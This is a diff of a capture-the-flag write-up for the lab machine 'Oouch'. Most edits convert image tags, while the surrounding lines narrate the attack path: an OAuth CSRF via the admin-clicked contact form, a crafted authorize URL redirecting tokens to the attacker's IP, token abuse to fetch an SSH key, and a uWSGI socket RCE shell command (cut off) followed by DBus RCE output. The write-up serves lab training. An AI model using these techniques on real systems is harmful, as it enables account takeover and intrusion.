@@ -33,25 +33,25 @@ Django -> Authorization Server
 
 Might need this information later. Also, we can see that this is the user `qtc` server.
 
-<figure><img src="../../../.gitbook/assets/image (1901).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1901).png>)
 
 ### Port 5000
 
 This webpage just shows a login page:
 
-<figure><img src="../../../.gitbook/assets/image (3462).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3462).png>)
 
 I registered a user and logged in to see the dashboard.
 
-<figure><img src="../../../.gitbook/assets/image (3959).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3959).png>)
 
 There are 3 main functions, a Password Change, Documents and the Contact one. The Password Change is not interesting, Documents are only available for the administrator user. That just leaves  the Contact function.
 
-<figure><img src="../../../.gitbook/assets/image (2125).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2125).png>)
 
 This looks like an XSS platform to somehow steal the administrator cookie. When trying to submit a basic XSS payload, this is what I got:
 
-<figure><img src="../../../.gitbook/assets/image (1634).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1634).png>)
 
 Further testing of this endpoint revealed that the administrator clicks links that are sent in that Contact Form. Could be useful later. I ran a `gobuster` scan on the machine to see what other endpoints are hidden. I found a weird `/oauth` endpoint that could be of use: (this took a lot of wordlists to do)
 
@@ -88,13 +88,13 @@ We can head to that and see what it does.
 
 This gives us instructions on how to connet to the OAuth server running on this machine:
 
-<figure><img src="../../../.gitbook/assets/image (1994).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1994).png>)
 
 When trying to access it, it attempts to access `authorization.oouch.htb:8000`. So the OAuth server is running on port 8000.
 
 Using the connect options shows us this:
 
-<figure><img src="../../../.gitbook/assets/image (3894).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3894).png>)
 
 When we click authorize, we just are logged in as the same user it seems.
 
@@ -102,7 +102,7 @@ When we click authorize, we just are logged in as the same user it seems.
 
 On Port 8000, all we see is this:
 
-<figure><img src="../../../.gitbook/assets/image (2680).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2680).png>)
 
 When are visiting this port from port 5000 via OAuth, this is the request that gets sent:
 
@@ -122,11 +122,11 @@ Upgrade-Insecure-Requests: 1
 
 And this is the page that gets shown to us:
 
-<figure><img src="../../../.gitbook/assets/image (3176).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3176).png>)
 
 When visiting `http://authorization.oouch.htb:8000`, we can see how to register to this server:
 
-<figure><img src="../../../.gitbook/assets/image (3436).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3436).png>)
 
 In case you're unaware of OAuth 2.0, you can read this:
 
@@ -136,7 +136,7 @@ It basically is the service that allows us to 'Login with Facebook' or other soc
 
 For now, we can register a user and keep enumerating this website. This is the page we get to after logging in:
 
-<figure><img src="../../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(381).png>)
 
 Clicking these two options don't seem to do much. I ran a `gobuster` scan once again.
 
@@ -162,11 +162,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 We can see a new endpont at `/applications`. Trying to access this requires credentials:
 
-<figure><img src="../../../.gitbook/assets/image (1821).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1821).png>)
 
 I did not have any credentials for now. After creating this account and re-testing, using the `/oauth/connect` function earlier now shows a different user profile.
 
-<figure><img src="../../../.gitbook/assets/image (3808).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3808).png>)
 
 The website recognises my new OAuth account that I created and is considered 'connected'.
 
@@ -174,11 +174,11 @@ The website recognises my new OAuth account that I created and is considered 'co
 
 Here's an overview of how exactly OAuth works:
 
-<figure><img src="../../../.gitbook/assets/image (2151).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2151).png>)
 
 We can view the HTTP requests throguh Burpsuite to see what exactly is happening.
 
-<figure><img src="../../../.gitbook/assets/image (2169).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2169).png>)
 
 These 4 requests are essentially the OAuth mechanism, and there is the access token in a POST request. Our goal is to authenticate as `qtc`, since he probably is the administrator user of this machine. As such, we can use a CSRF attack because this implementation of OAuth does not seem to send the `state` parameter. Earlier, we found a method to make the administrator `qtc` click links by sending it in the Contact form.
 
@@ -230,7 +230,7 @@ http://consumer.oouch.htb:5000/oauth/connect/token?code=IhKT0Gc97DNDoVQp2Urhfun5
 
 Send this in the Contact Form and wait for a little bit. Then, we can attempt to use OAuth by accessing `/oauth/login` on the consumer server. If done correctly, this is what we would see in the Documents section:
 
-<figure><img src="../../../.gitbook/assets/image (2649).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2649).png>)
 
 Great! Now we have credentials to access some other stuff. There's an SSH key somewhere on this  website as well.
 
@@ -238,7 +238,7 @@ Great! Now we have credentials to access some other stuff. There's an SSH key so
 
 Now that we have credentials, we can register somewhere. I used `gobuster` to scan the authorization server, and found another endpoint at `/oauth/applications/register`.
 
-<figure><img src="../../../.gitbook/assets/image (3047).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3047).png>)
 
 Based on the documents, it seems that the `/api/get_user` endpoint supports a GET method, meaning the authorization parameter is probably a token. Problem is, we don't have any credentials or tokens from `qtc`, we only forced a link. The next step is to steal a token or password, and I'm guessing we need him to click another link.
 
@@ -246,35 +246,33 @@ We can create a fake request that redirects the user to our our machine. This wo
 
 As such, we can fill up the registering form as such:
 
-<figure><img src="../../../.gitbook/assets/image (3146).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3146).png>)
 
 This article was useful in reading about how these requests are constructed.
 
 {% embed url="https://www.oauth.com/oauth2-servers/authorization/the-authorization-request/" %}
 
-{% code overflow="wrap" %}
 ```
 http://authorization.oouch.htb:8000/oauth/authorize?client_id=g2uRKpKRQBvO7OXm8A1uBNuxWpcgflZYfWoLKRzR&redirect_uri=http://10.10.14.39&grant_type=authorization_code&client_secret=Wn49XJLzIuvRACjBLnYZN2tdFc3UI3416zHjSyAB1a2D5ar1zGzzlsEZX6UN96uW4TQlIrGUNhKEwTrl6xJctO2CSXVBNjbE76zdlteHRjT4cjSn2nLYAsBlIpKgOSRh
 ```
-{% endcode %}
 
 Then we can listen on port 80 to capture the request being sent
 
-<figure><img src="../../../.gitbook/assets/image (2838).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2838).png>)
 
 ### /oauth/token
 
 After getting this token, I was stuck for a long while. I was back to this page and realised I never really look at the `/oauth/token` function here:
 
-<figure><img src="../../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(573).png>)
 
 Viewing the HTTP request, I realised that the `sessionid` token could be used to login as `qtc`.
 
-<figure><img src="../../../.gitbook/assets/image (1482).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1482).png>)
 
 Afterwards, accessing the `/oauth/token` endpoint did nothing for me until I experimented with sending POST requests:
 
-<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(142).png>)
 
 We can read more about grant\_types here:
 
@@ -282,11 +280,11 @@ We can read more about grant\_types here:
 
 By controlling the grant type, we can requests for the client\_credentials. This can be done by first going to the Register page and changing the grant type:
 
-<figure><img src="../../../.gitbook/assets/image (2178).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2178).png>)
 
 Then we can send a reuqest specifying the client ID, client secret and the grant type and the token for `qtc` will be given to us:
 
-<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(180).png>)
 
 This `access_token` parameter is the API token we need!
 
@@ -307,15 +305,15 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(687).png>)
 
 Now that we have access to this, we need to find the SSH key. After testing out a few endpoints, I found that `get_ssh` was the right one.
 
-<figure><img src="../../../.gitbook/assets/image (1512).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1512).png>)
 
 Then we can just SSH in as `qtc`.
 
-<figure><img src="../../../.gitbook/assets/image (2789).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2789).png>)
 
 ## Privilege Escalation
 
@@ -354,7 +352,7 @@ There was some kind of cronjob going on, and there are docker containers present
 
 We can probably SSH into some of them. Rough guesing let me SSH into `172.18.0.4`.
 
-<figure><img src="../../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1423).png>)
 
 Checking the processes, we see a lot of `uswgi` processes running:
 
@@ -503,7 +501,7 @@ qtc@de8d92c274d6:~$ python3 rce.py -m unix -u /tmp/uwsgi.socket -c 'bash -c "bas
 [*]Sending payload.
 ```
 
-<figure><img src="../../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(932).png>)
 
 ### DBus RCE
 
@@ -522,6 +520,6 @@ method return time=1678608399.001859 sender=:1.3 -> destination=:1.436 serial=4 
    string "Carried out :D"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1045).png>)
 
 I wonder why this machine isn't in Insane level...
